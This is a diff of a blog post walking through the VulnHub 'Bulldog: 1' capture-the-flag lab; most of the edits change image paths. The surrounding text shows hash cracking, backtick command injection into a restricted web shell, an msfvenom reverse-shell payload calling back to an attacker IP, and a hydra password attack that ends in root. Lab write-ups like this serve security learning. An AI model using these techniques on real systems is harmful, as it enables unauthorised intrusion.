@@ -1,6 +1,6 @@
 ---
 layout: post
-last_modified_at: 2018-06-07 17:05:01 +0000
+last_modified_at: 2018-06-17 15:46:16 +0000
 title: "Bulldog: 1 Walkthrough"
 category: Walkthrough
 tags: [VulnHub, Bulldog]
@@ -45,7 +45,7 @@ PORT     STATE SERVICE REASON         VERSION
 
 Let's explore the web service first. This is how the site looks like in my browser.
 
-![screenshot-1](/assets/images/posts/bulldog-walkthrough/screenshot-1.png)
+![screenshot-1](/assets/images/posts/bulldog-1-walkthrough/screenshot-1.png)
 
 There's no clue in the HTML source of the landing page as well as its internal link, on how to proceed.
 
@@ -77,7 +77,7 @@ The `robots.txt` probably doesn't conform to specifications or it'll appear in t
 
 This page `/dev` contains interesting information. There's a link to `/dev/shell`, I suppose, a web shell. Under the hood of the HTML source, there are SHA1 password-hashes of members from the development team.
 
-![screenshot-2](/assets/images/posts/bulldog-walkthrough/screenshot-2.png)
+![screenshot-2](/assets/images/posts/bulldog-1-walkthrough/screenshot-2.png)
 
 Let's clean up the hashes and send them to John the Ripper for offline cracking.
 
@@ -90,19 +90,19 @@ sarah@bulldogindustries.com:bulldoglover:::::
 
 Thank goodness authentication is a must, to use the web shell.
 
-![screenshot-3](/assets/images/posts/bulldog-walkthrough/screenshot-3.png)
+![screenshot-3](/assets/images/posts/bulldog-1-walkthrough/screenshot-3.png)
 
 ### Django Site Administration
 
 Let's use one of the credentials (`nick:bulldog`) and see if we can authenticate with the server to use the web shell.
 
-![screenshot-4](/assets/images/posts/bulldog-walkthrough/screenshot-4.png)
+![screenshot-4](/assets/images/posts/bulldog-1-walkthrough/screenshot-4.png)
 
-![screenshot-5](/assets/images/posts/bulldog-walkthrough/screenshot-5.png)
+![screenshot-5](/assets/images/posts/bulldog-1-walkthrough/screenshot-5.png)
 
 I have a session with the site. Now, are we able to use the web shell by going to `/dev/shell`?
 
-![screenshot-6](/assets/images/posts/bulldog-walkthrough/screenshot-6.png)
+![screenshot-6](/assets/images/posts/bulldog-1-walkthrough/screenshot-6.png)
 
 Sweet. The web shell appears to restrict itself to certain commands.
 
@@ -112,7 +112,7 @@ One of my favorite features in `bash` is [command substitution][5] using backtic
 
 > "Bash performs the expansion by executing command in a subshell environment and replacing the command substitution with the standard output of the command, with any trailing newlines deleted."
 
-![screenshot-7](/assets/images/posts/bulldog-walkthrough/screenshot-7.png)
+![screenshot-7](/assets/images/posts/bulldog-1-walkthrough/screenshot-7.png)
 
 ### Low Privilege Shell
 
@@ -122,33 +122,33 @@ Let's transfer (using `wget`) a single-stage reverse shell payload and then run 
 # msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.36.4 LPORT=443 -f elf -o bulldog
 ```
 
-![screenshot-8](/assets/images/posts/bulldog-walkthrough/screenshot-8.png)
+![screenshot-8](/assets/images/posts/bulldog-1-walkthrough/screenshot-8.png)
 
-![screenshot-9](/assets/images/posts/bulldog-walkthrough/screenshot-9.png)
+![screenshot-9](/assets/images/posts/bulldog-1-walkthrough/screenshot-9.png)
 
-![screenshot-10](/assets/images/posts/bulldog-walkthrough/screenshot-10.png)
+![screenshot-10](/assets/images/posts/bulldog-1-walkthrough/screenshot-10.png)
 
 Although a low-privilege shell appears, let's spawn a pseudo-TTY for better output control.
 
-![screenshot-11](/assets/images/posts/bulldog-walkthrough/screenshot-11.png)
+![screenshot-11](/assets/images/posts/bulldog-1-walkthrough/screenshot-11.png)
 
 ### Privilege Escalation
 
 I find two users — `django` and `bulldogadmin`, during enumeration. They can `sudo` as `root`. It's a pity I don't have their passwords.
 
-![screenshot-12](/assets/images/posts/bulldog-walkthrough/screenshot-12.png)
+![screenshot-12](/assets/images/posts/bulldog-1-walkthrough/screenshot-12.png)
 
-![screenshot-13](/assets/images/posts/bulldog-walkthrough/screenshot-13.png)
+![screenshot-13](/assets/images/posts/bulldog-1-walkthrough/screenshot-13.png)
 
-![screenshot-14](/assets/images/posts/bulldog-walkthrough/screenshot-14.png)
+![screenshot-14](/assets/images/posts/bulldog-1-walkthrough/screenshot-14.png)
 
 Notice `.hiddenadmindirectory` in the home directory of `bulldogadmin`?
 
-![screenshot-15](/assets/images/posts/bulldog-walkthrough/screenshot-15.png)
+![screenshot-15](/assets/images/posts/bulldog-1-walkthrough/screenshot-15.png)
 
-![screenshot-16](/assets/images/posts/bulldog-walkthrough/screenshot-16.png)
+![screenshot-16](/assets/images/posts/bulldog-1-walkthrough/screenshot-16.png)
 
-![screenshot-17](/assets/images/posts/bulldog-walkthrough/screenshot-17.png)
+![screenshot-17](/assets/images/posts/bulldog-1-walkthrough/screenshot-17.png)
 
 Seems like reverse engineering the ELF binary is my ticket to `root`.
 
@@ -156,7 +156,7 @@ Seems like reverse engineering the ELF binary is my ticket to `root`.
 
 The first thing to do in reverse engineering is to look for interesting strings and that's what I did.
 
-![screenshot-18](/assets/images/posts/bulldog-walkthrough/screenshot-18.png)
+![screenshot-18](/assets/images/posts/bulldog-1-walkthrough/screenshot-18.png)
 
 If you look past the "`H`", you see "`SUPERultimatePASSWORDyouCANTget`". I'll have my work cut short if this is the password belonging to any of the users, since they can `sudo` to `root`. Let's find out with `hydra`.
 
@@ -171,11 +171,11 @@ root
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-![screenshot-19](/assets/images/posts/bulldog-walkthrough/screenshot-19.png)
+![screenshot-19](/assets/images/posts/bulldog-1-walkthrough/screenshot-19.png)
 
 It's done.
 
-![screenshot-20](/assets/images/posts/bulldog-walkthrough/screenshot-20.png)
+![screenshot-20](/assets/images/posts/bulldog-1-walkthrough/screenshot-20.png)
 
 :dancer:
 
@@ -183,7 +183,7 @@ It's done.
 
 If I have to guess, I say the other way to get root is perhaps through the Dirty CoW exploit as hinted in the notice page.
 
-![screenshot-21](/assets/images/posts/bulldog-walkthrough/screenshot-21.png)
+![screenshot-21](/assets/images/posts/bulldog-1-walkthrough/screenshot-21.png)
 
 To an attacker, a shell is a shell is a shell. :imp:
 
